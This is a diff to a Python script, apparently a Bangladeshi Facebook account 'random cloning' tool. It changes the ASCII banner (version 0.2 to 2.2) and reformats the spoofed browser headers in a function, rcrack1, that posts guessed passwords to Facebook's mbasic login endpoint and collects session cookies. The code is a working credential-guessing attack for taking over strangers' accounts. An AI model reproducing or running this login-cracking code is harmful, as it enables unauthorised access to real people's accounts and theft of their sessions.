@@ -165,10 +165,10 @@ logo = ("""
   \_____|_|  |_|\____/|_____/   |_|   
                                  
 \033[1;94m       [+]===============================================[+]
-\033[1;94m       [+]        CREATED BY   :  GHOST SURJO            \033[1;94m[+]
-\033[1;94m       [+]        ON GITHUB    :  Surjo178               \033[1;94m[+]
-\033[1;94m       [+]        TEAM              :  GHOST             \033[1;94m[+]
-\033[1;94m       [+]        TOOL VERSION :  0.2                    \033[1;94m[+]
+\033[1;94m       [+]        CREATED BY   :  GHOST SURJO                 \033[1;94m[+]
+\033[1;94m       [+]        ON GITHUB    :  Surjo178             \033[1;94m[+]
+\033[1;94m       [+]        TEAM              :  GHOST                \033[1;94m[+]
+\033[1;94m       [+]        TOOL VERSION :  2.2                    \033[1;94m[+]
 \033[1;94m       [+]        TOOL STATUS  :  RANDOM CLONING         \033[1;94m[+]
 \033[1;94m       [+]        COUNTRY      :  BANGLADESH             \033[1;94m[+]
 \033[1;94m       [+]===============================================[+]
@@ -252,21 +252,22 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
-   		 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
+		   'method' : ' POST ',
+  	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+ 		  'accept-language': 'en-US,en;q=0.9',
+  		 'cache-control': 'max-age=0',
+ 		  'sec-ch-prefers-color-scheme': 'light',
+  		 'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+   	    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+  		 'sec-ch-ua-mobile': '?1',
+   		'sec-ch-ua-platform': '"Android"',
+  		 'sec-ch-ua-platform-version': '"13.0.0"',
+  		 'sec-fetch-dest': 'document',
+  		 'sec-fetch-mode': 'navigate',
+  		 'sec-fetch-site': 'none',
+  		 'sec-fetch-user': '?1',
+   		'upgrade-insecure-requests': '1',
+   		'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
 }
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
